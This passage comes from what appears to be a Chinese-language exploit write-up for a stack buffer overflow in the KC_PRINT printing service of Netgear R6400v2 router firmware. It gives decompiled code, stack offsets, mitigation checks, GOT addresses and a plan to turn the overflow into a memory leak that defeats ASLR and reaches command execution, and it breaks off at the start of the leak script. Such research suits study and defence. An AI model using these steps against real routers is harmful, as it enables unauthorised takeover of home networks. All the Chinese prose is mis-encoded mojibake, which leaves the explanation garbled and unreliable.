è¯»å–åç»­çš„æ›´å¤šæ¶ˆæ¯å†…å®¹ã€‚è€Œè¿™ä¸ª <code>content-len</code>  æ˜¯æ²¡æœ‰è¿›è¡Œé•¿åº¦æ£€æŸ¥çš„ï¼Œè¿™é‡Œä»¥ <code>Response_Get_Jobs</code> å‡½æ•°ä¸ºä¾‹ï¼Œ æ¥åšè¿›ä¸€æ­¥çš„åˆ†æã€‚</p><p>åœ¨ <code>Response_Get_Jobs</code> ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">flag1 = <span class="number">0</span>;</span><br><span class="line"> prefix_size = <span class="number">0x4A</span>;</span><br><span class="line"> prefix_ptr = <span class="built_in">malloc</span>(<span class="number">0x4A</span>u);</span><br><span class="line"> <span class="keyword">if</span> ( !prefix_ptr )</span><br><span class="line"> &#123;</span><br><span class="line">   perror(<span class="string">&quot;Response_Get_Jobs: malloc xx&quot;</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="built_in">memset</span>(prefix_ptr, <span class="number">0</span>, prefix_size);</span><br><span class="line"> cnt = memcpy_n(prefix_ptr, total, &amp;recv_buf[offset], <span class="number">2u</span>);</span><br><span class="line"> total += cnt;</span><br><span class="line"> <span class="keyword">if</span> ( *recv_buf == <span class="number">1</span> &amp;&amp; !recv_buf[<span class="number">1</span>] )</span><br><span class="line">   flag1 = <span class="number">1</span>;</span><br><span class="line"> offset += <span class="number">2</span>;</span><br><span class="line"> *(prefix_ptr + total++) = <span class="number">0</span>;</span><br><span class="line"> *(prefix_ptr + total++) = <span class="number">0</span>;</span><br><span class="line"> offset += <span class="number">2</span>;</span><br><span class="line"> total += memcpy_n(prefix_ptr, total, &amp;recv_buf[offset], <span class="number">4u</span>);</span><br><span class="line"> offset += <span class="number">4</span>;</span><br><span class="line"> v12 = <span class="number">66</span>;</span><br><span class="line"> cnt = memcpy_n(prefix_ptr, total, &amp;unk_1823C, <span class="number">0x42</span>u);</span><br><span class="line"> total += cnt;</span><br><span class="line"> ++offset;                                     <span class="comment">// offest == 09</span></span><br><span class="line"> <span class="built_in">memset</span>(v9, <span class="number">0</span>, <span class="keyword">sizeof</span>(v9));</span><br><span class="line"> <span class="built_in">memset</span>(buf_2048, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf_2048));</span><br><span class="line"> buf_2048[subffix_offset++] = <span class="number">5</span>;</span><br><span class="line"> <span class="keyword">if</span> ( !flag1 )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">while</span> ( recv_buf[offset] != <span class="number">3</span> &amp;&amp; offset &lt;= content_len )</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> ( recv_buf[offset] == <span class="number">0x44</span> &amp;&amp; !flag2 )</span><br><span class="line">     &#123;</span><br><span class="line">       flag2 = <span class="number">1</span>;</span><br><span class="line">       buf_2048[subffix_offset++] = <span class="number">68</span>;</span><br><span class="line">       copy_len = (recv_buf[offset + <span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + recv_buf[offset + <span class="number">2</span>];</span><br><span class="line">       cnt = memcpy_n(buf_2048, subffix_offset, &amp;recv_buf[offset + <span class="number">1</span>], copy_len + <span class="number">2</span>);</span><br><span class="line">       subffix_offset += cnt;</span><br><span class="line">     &#125;</span><br><span class="line">     ++offset;                                 <span class="comment">// offset=10</span></span><br><span class="line">     copy_len = (recv_buf[offset] &lt;&lt; <span class="number">8</span>) + recv_buf[offset + <span class="number">1</span>];</span><br><span class="line">     offset += <span class="number">2</span> + copy_len;                   <span class="comment">// offset 12</span></span><br><span class="line">     copy_len = (recv_buf[offset] &lt;&lt; <span class="number">8</span>) + recv_buf[offset + <span class="number">1</span>];</span><br><span class="line">     offset += <span class="number">2</span>;                              <span class="comment">// offset 14</span></span><br><span class="line">     <span class="keyword">if</span> ( flag2 )</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="built_in">memset</span>(command, <span class="number">0</span>, <span class="keyword">sizeof</span>(command));</span><br><span class="line">       <span class="built_in">memcpy</span>(command, &amp;recv_buf[offset], copy_len);</span><br><span class="line">       <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-media-sheets-completed&quot;</span>) )</span><br></pre></td></tr></table></figure><p>å­˜åœ¨ä¸€ä¸ªç¼“å†²åŒºæº¢å‡ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( flag2 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memset</span>(command, <span class="number">0</span>, <span class="keyword">sizeof</span>(command));</span><br><span class="line">  <span class="built_in">memcpy</span>(command, &amp;recv_buf[offset], copy_len);</span><br></pre></td></tr></table></figure><p>æ­¤å¤„çš„ <code>copy_len</code>  æ˜¯å®Œå…¨å¯æ§çš„ï¼Œ ä¸” <code>buf_2048</code>   åœ¨æ ˆä¸Šï¼Œ æˆ‘ä»¬åªéœ€è®© <code>flag1</code>  ä¸ç­‰äº1 ï¼Œ <code>flag2</code> ç­‰äº 1 ï¼Œå°±èƒ½è¿›å…¥åˆ°è¿™ä¸ªåˆ†æ”¯ï¼Œ å³æ»¡è¶³  <code> *recv_buf == 1 &amp;&amp; !recv_buf[1]</code> ä¸” <code> recv_buf[offset] == 0x44</code> æ¡ä»¶å³å¯ã€‚</p><h2 id="åˆ©ç”¨ç¼–å†™"><a href="#åˆ©ç”¨ç¼–å†™" class="headerlink" title="åˆ©ç”¨ç¼–å†™"></a>åˆ©ç”¨ç¼–å†™</h2><p>è¯¥ç¨‹åºä¿æŠ¤éƒ½æ²¡æœ‰å¼€å¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; checksec</span><br><span class="line">[*] <span class="string">&#x27;/workhub/Dropbox/Attachments/IoT and BaseBand/Router/Netgear/R6400v2/fs/squashfs-root/usr/bin/KC_PRINT&#x27;</span></span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8000)</span><br><span class="line"></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>æ—¢æ²¡æœ‰ <code>canary</code>  ä¹Ÿæ²¡æœ‰ <code>PIE</code> ï¼Œ è¿™æå¤§çš„æ–¹ä¾¿äº†æˆ‘ä»¬çš„æ¼æ´åˆ©ç”¨ã€‚  </p><p>ç³»ç»ŸéšæœºåŒ–å¼€å¯æƒ…å†µï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat /proc/sys/kernel/randomize_va_space</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure><p><code>ASLR</code> ç­‰çº§ä¸º 1ï¼Œ å³æ ˆå’Œå…±äº«åº“æ˜¯å®Œå…¨éšæœºçš„ï¼Œ ä½†æ˜¯å †çš„åˆ†é…ä¸éšæœºã€‚</p><p>æˆ‘ä»¬çš„ç›®çš„æ˜¯é€šè¿‡è¿™ä¸ªæ ˆæº¢å‡ºæ¼æ´ï¼Œ æ¥è¾¾åˆ°ä»»æ„å‘½ä»¤æ‰§è¡Œçš„ç›®çš„ã€‚æˆ‘ä»¬æ£€ç´¢è¿™ä¸ªç¨‹åºï¼Œå‘ç°ç¨‹åºé‡Œå¹¶æ²¡æœ‰ç°æˆçš„ <code>system</code> æˆ–è€… <code>popen</code> å‡½æ•°ï¼Œå› æ­¤ <code>ret2system</code> çš„æ–¹æ³•å¹¶ä¸èƒ½ç›´æ¥ä½¿ç”¨ï¼Œ å› æ­¤æˆ‘ä»¬éœ€è¦ç»•è¿‡éšæœºåŒ–ï¼Œéœ€è¦æ³„æ¼ <code>uclibc</code> ä¸­çš„ <code>system</code> åœ°å€ï¼Œ å› æ­¤é¦–å…ˆéœ€è¦ä¸€ä¸ªä¿¡æ¯æ³„æ¼çš„æ–¹æ³•ï¼Œæ¥ leak <code>uclibc </code> çš„åŠ è½½åŸºå€ã€‚</p><h3 id="Bypass-ASLR"><a href="#Bypass-ASLR" class="headerlink" title="Bypass ASLR"></a>Bypass ASLR</h3><p>å…¶å®ä¸€èˆ¬è¿™ç§æ€è·¯ï¼Œ æˆ‘ä»¬å¯ä»¥é€šè¿‡ ROP ï¼Œ è°ƒç”¨ <code>write</code> ç­‰å‡½æ•°è¯»å–  <code>got</code> è¡¨ä¸­çš„å€¼æ¥åš <code>uclibc </code>çš„åœ°å€ã€‚ ä½†æ˜¯è¿™ä¸ªæ–¹æ³•æˆ‘ä»¬å¯èƒ½éœ€è¦çŸ¥é“æˆ‘ä»¬å½“å‰é“¾æ¥çš„ <code>fd</code> ã€‚å¦‚æœä¸çŸ¥é“ <code>fd</code> ï¼Œ æˆ‘ä»¬å¯èƒ½éœ€è¦çˆ†ç ´è¿™ä¸ªï¼Œ ä½†ç”±äºè¿™ä¸ªç¨‹åºæ˜¯å¤šçº¿ç¨‹è€Œä¸æ˜¯çˆ¶å­è¿›ç¨‹çš„å½¢å¼ï¼Œ å¦‚æœå¤±è´¥å¯èƒ½ä¼šé€ æˆ crashã€‚ </p><p>è¿›ä¸€æ­¥åˆ†æå‡½æ•°ï¼Œ ä»¥åŠé˜…è¯» slide  ï¼Œæˆ‘ä»¬å‘ç°ç¨‹åºä¸­æœ‰ä¸€ä¸ªå¯ä»¥åšä»»æ„åœ°å€è¯»å†™çš„æ–¹æ³•ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-763f460331a41355beb24dcb1b383c47-159298.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-763f460331a41355beb24dcb1b383c47-159298.png"></a></p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡æ ˆæº¢å‡ºï¼Œ æ¥è¦†ç›– <code>prefix_ptr</code>  å’Œ <code>prefix_size </code> é€šè¿‡æ§åˆ¶è¿™ä¸¤ä¸ªå˜é‡ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€š <code>write_ipp_response</code>  å°†æˆ‘ä»¬æƒ³è¯»å–çš„å†…å®¹å‘é€å›æ¥ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> command[<span class="number">64</span>]; <span class="comment">// [sp+24h] [bp-1090h] BYREF</span></span><br><span class="line"><span class="keyword">char</span> buf_2048[<span class="number">2048</span>]; <span class="comment">// [sp+64h] [bp-1050h] BYREF</span></span><br><span class="line"><span class="keyword">char</span> v9[<span class="number">2048</span>]; <span class="comment">// [sp+864h] [bp-850h] BYREF</span></span><br><span class="line"><span class="keyword">int</span> v10; <span class="comment">// [sp+1064h] [bp-50h]</span></span><br><span class="line"><span class="keyword">size_t</span> copy_len; <span class="comment">// [sp+1068h] [bp-4Ch]</span></span><br><span class="line"><span class="keyword">int</span> v12; <span class="comment">// [sp+106Ch] [bp-48h]</span></span><br><span class="line"><span class="keyword">size_t</span> cnt; <span class="comment">// [sp+1070h] [bp-44h]</span></span><br><span class="line"><span class="keyword">size_t</span> prefix_size; <span class="comment">// [sp+1074h] [bp-40h]</span></span><br><span class="line"><span class="keyword">int</span> total; <span class="comment">// [sp+1078h] [bp-3Ch]</span></span><br><span class="line"><span class="keyword">void</span> *prefix_ptr; <span class="comment">// [sp+107Ch] [bp-38h]</span></span><br><span class="line"><span class="keyword">int</span> v17; <span class="comment">// [sp+1080h] [bp-34h]</span></span><br><span class="line"><span class="keyword">int</span> client_sock; <span class="comment">// [sp+1084h] [bp-30h]</span></span><br><span class="line"><span class="keyword">int</span> v19; <span class="comment">// [sp+1088h] [bp-2Ch]</span></span><br><span class="line"><span class="keyword">int</span> v20; <span class="comment">// [sp+108Ch] [bp-28h]</span></span><br><span class="line"><span class="keyword">char</span> flag1; <span class="comment">// [sp+1093h] [bp-21h]</span></span><br><span class="line"><span class="keyword">char</span> v22; <span class="comment">// [sp+1094h] [bp-20h]</span></span><br><span class="line"><span class="keyword">char</span> job_state_resons; <span class="comment">// [sp+1095h] [bp-1Fh]</span></span><br><span class="line"><span class="keyword">char</span> job_state; <span class="comment">// [sp+1096h] [bp-1Eh]</span></span><br><span class="line"><span class="keyword">char</span> job_originating_user_name; <span class="comment">// [sp+1097h] [bp-1Dh]</span></span><br><span class="line"><span class="keyword">char</span> job_name; <span class="comment">// [sp+1098h] [bp-1Ch]</span></span><br><span class="line"><span class="keyword">char</span> job_id; <span class="comment">// [sp+1099h] [bp-1Bh]</span></span><br><span class="line"><span class="keyword">char</span> v28; <span class="comment">// [sp+109Ah] [bp-1Ah]</span></span><br><span class="line"><span class="keyword">char</span> flag2; <span class="comment">// [sp+109Bh] [bp-19h]</span></span><br><span class="line"><span class="keyword">size_t</span> final_size; <span class="comment">// [sp+109Ch] [bp-18h]</span></span><br><span class="line"><span class="keyword">int</span> offset; <span class="comment">// [sp+10A0h] [bp-14h]</span></span><br><span class="line"><span class="keyword">size_t</span> response_len; <span class="comment">// [sp+10A4h] [bp-10h]</span></span><br><span class="line"><span class="keyword">void</span> *final_ptr; <span class="comment">// [sp+10A8h] [bp-Ch]</span></span><br><span class="line"><span class="keyword">size_t</span> subffix_offset; <span class="comment">// [sp+10ACh] [bp-8h]</span></span><br></pre></td></tr></table></figure><p>æœ€é¦–å…ˆçš„æƒ³æ³•è‚¯å®šæ˜¯é€šè¿‡è¦†ç›– <code>prefix_ptr</code> æŒ‡å‘ <code>.got</code>  æ¥åšè¯»å†™ï¼Œ ä½†æ˜¯å¦‚æœæˆ‘ä»¬ç›´æ¥çš„æŒ‡å‘äº†å‡½æ•°çš„ <code>.got</code>  , ä¾‹å¦‚ <code>strcpy_ptr</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.got:<span class="number">000180F</span>0 strcpy_ptr      DCD __imp_strcpy        ; DATA XREF: <span class="built_in">strcpy</span>+<span class="number">8</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯åœ¨è°ƒç”¨ <code>write_ipp_response</code> åï¼Œ ç¨‹åºä¼š <code>free(prefix_ptr);</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v10 = write_ipp_response(client_sock, final_ptr, response_len);</span><br><span class="line"><span class="keyword">if</span> ( prefix_ptr )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>(prefix_ptr);</span><br><span class="line">  prefix_ptr = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœæ˜¯ç›´æ¥æ§åˆ¶  <code>prefix_ptr == 000180F0</code> ï¼Œ åœ¨ <code>free</code> çš„è¿‡ç¨‹ä¸­ä¼šé€ æˆå´©æºƒã€‚ æœ€åæˆ‘ä»¬å‘ç°å½“æŠŠ <code>prefix_ptr </code> æŒ‡å‘ <code>.got</code>  çš„å¼€å¤´</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.got:<span class="number">000180E4</span>                                         ; sub_8C0C+<span class="number">8</span>â†‘o ...</span><br><span class="line">.got:<span class="number">000180E8</span>                 DCD <span class="number">0</span></span><br><span class="line">.got:<span class="number">000180</span>EC off_180EC       DCD <span class="number">0</span>                   ; DATA XREF: sub_8C0C+Câ†‘r</span><br><span class="line">.got:<span class="number">000180F</span>0 strcpy_ptr      DCD __imp_strcpy        ; DATA XREF: <span class="built_in">strcpy</span>+<span class="number">8</span>â†‘r</span><br></pre></td></tr></table></figure><p>å³å°† <code>prefix_ptr</code> æŒ‡å‘  <code>000180E4</code>  æ˜¯ä¸ä¼šå´©æºƒçš„ã€‚</p><blockquote><p>è¿™é‡Œå’Œ å°ä¼™ä¼´  @aobo @leomxxj è®¨è®ºæ¥ä¸‹ ï¼Œ çŒœæµ‹åº”è¯¥æ˜¯å¦‚æœæ˜¯ free(0x000180EC) ï¼Œ å½“ uclibc ä¼šå¯¹  libc çš„åœ°å€å†™ï¼Œ é€ æˆ crash<br>å¦‚æœ free(0x00180E4) </p><p>pwndbg&gt; telescope 0x000180E4<br>    00:0000â”‚  0x180e4 â€”â–¸ 0x1800c â—‚â€” 0x1<br>    01:0004â”‚  0x180e8 â€”â–¸ 0x40024030 â—‚â€” 0x0<br>pwndbg&gt; vmmap 0x1800c<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br> 0x18000    0x19000 rw-p     1000 10000  /usr/bin/KC_PRINT +0xc<br>0x1800c åœ°å€æ˜¯å¯è¯»å†™çš„</p></blockquote><p>å¦å¤–åœ¨ç¼–å†™è¿™éƒ¨åˆ† exploit çš„æ—¶å€™ï¼Œ æˆ‘ä»¬å‘ç°å¤„ç† <code>recv_buf</code> æ¶ˆæ¯çš„æ—¶å€™</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !flag1 )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">while</span> ( recv_buf[offset] != <span class="number">3</span> &amp;&amp; offset &lt;= content_len )</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> ( recv_buf[offset] == <span class="number">0x44</span> &amp;&amp; !flag2 )</span><br><span class="line">     &#123;</span><br></pre></td></tr></table></figure><p>è¿™éƒ¨åˆ†æ˜¯ä¸€ä¸ª <code>while</code> å¾ªç¯ï¼Œåªæœ‰å½“æ¶ˆæ¯ä¸º <code>\x03</code> çš„æ—¶å€™ï¼Œ æ‰ä¼šç»“æŸå¾ªç¯ï¼Œ å› æ­¤æˆ‘ä»¬éœ€è¦ <code>offset</code>  è®¾ç½®å¥½ï¼Œ </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    offset += copy_len;</span><br><span class="line">.text:<span class="number">00010</span>A30                 LDR             R2, [R11,<span class="meta">#offset]</span></span><br><span class="line">.text:<span class="number">00010</span>A34                 LDR             R3, [R11,#copy_len]</span><br><span class="line">.text:<span class="number">00010</span>A38                 ADD             R3, R2, R3</span><br><span class="line">.text:<span class="number">00010</span>A3C                 STR             R3, [R11,#<span class="number">-0x14</span>]</span><br></pre></td></tr></table></figure><p>ç»“æŸå¾ªç¯åˆ° <code>write_ipp_response</code> å‡½æ•°ä¹‹å‰ ï¼Œæˆ‘ä»¬è¿˜éœ€è¦è¿‡ä¸¤ä¸ªåœ°æ–¹ï¼Œ ç¬¬ä¸€ä¸ªå¤„ï¼Œ ä¸ºäº†æ–¹ä¾¿æˆ‘ä»¬åœ¨ <code>command</code>  å‰è®¾ç½®ä¸€ä¸ª <code>job-id</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">    offset += <span class="number">2</span>;                              <span class="comment">// offset 14</span></span><br><span class="line">    <span class="keyword">if</span> ( flag2 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memset</span>(command, <span class="number">0</span>, <span class="keyword">sizeof</span>(command));</span><br><span class="line">      <span class="built_in">memcpy</span>(command, &amp;recv_buf[offset], copy_len);</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-media-sheets-completed&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v22 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-state-reasons&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        job_state_resons = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-name&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        job_name = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-originating-user-name&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        job_originating_user_name = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-state&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        job_state = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-id&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        job_id = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v28 )</span><br><span class="line">        &#123;</span><br><span class="line">          buf_2048[subffix_offset++] = <span class="number">68</span>;</span><br><span class="line">          buf_2048[subffix_offset++] = <span class="number">0</span>;</span><br><span class="line">          buf_2048[subffix_offset++] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cnt = memcpy_n(buf_2048, subffix_offset, &amp;recv_buf[offset - <span class="number">2</span>], copy_len + <span class="number">2</span>);</span><br><span class="line">        subffix_offset += cnt;</span><br><span class="line">        v28 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    offset += copy_len;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">final_size += prefix_size;</span><br><span class="line"><span class="keyword">if</span> ( flag1 )</span><br><span class="line">  v20 = sub_11D68(v17, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, v9);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  v20 = sub_11D68(v17, job_id, job_name, job_originating_user_name, job_state, job_state_resons, v22, v9);</span><br><span class="line"><span class="keyword">if</span> ( v20 &gt; <span class="number">0</span> )</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒå¤„ <code>final_ptr = malloc(++final_size);</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">LABEL_54:</span><br><span class="line">    *(final_ptr + response_len++) = <span class="number">3</span>;</span><br><span class="line">    v10 = write_ipp_response(client_sock, final_ptr, response_len);</span><br><span class="line">    <span class="keyword">if</span> ( prefix_ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(prefix_ptr);</span><br><span class="line">      prefix_ptr = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( final_ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(final_ptr);</span><br><span class="line">      final_ptr = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v10 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  final_ptr = <span class="built_in">malloc</span>(++final_size);</span><br><span class="line">  <span class="keyword">if</span> ( final_ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(final_ptr, <span class="number">0</span>, final_size);</span><br><span class="line">    cnt = memcpy_n(final_ptr, response_len, prefix_ptr, prefix_size);</span><br><span class="line">    response_len += cnt;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¾—è®© <code>final_size</code> çš„å€¼ä¸èƒ½å¤ªå¤§ï¼Œä¸ç„¶åˆ†é…ä¸å‡ºæ¥ç¨‹åºå°±ä¸ä¼šèµ°åˆ° <code>write_ipp_response</code> é‡Œï¼Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00010D78 loc_10D78                               ; CODE XREF: Response_Get_Jobs+868â†‘j</span><br><span class="line">.text:00010D78                 LDR             R3, [R11,#-0x18]</span><br><span class="line">.text:00010D7C                 ADD             R3, R3, #1</span><br><span class="line">.text:00010D80                 STR             R3, [R11,#-0x18]</span><br><span class="line">.text:00010D84                 LDR             R3, [R11,#-0x18]</span><br><span class="line">.text:00010D88                 MOV             R0, R3  ; size</span><br><span class="line">.text:00010D8C                 BL              malloc</span><br></pre></td></tr></table></figure><p>å³éœ€è¦è®¾ç½® <code>[R11, #-0x18]</code> çš„å€¼ï¼Œ è¿™æ˜¯åœ¨æ ˆä¸Šçš„ã€‚ æœ€åæˆ‘ leak çš„ä»£ç å¤§è‡´å¦‚ä¸‹:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 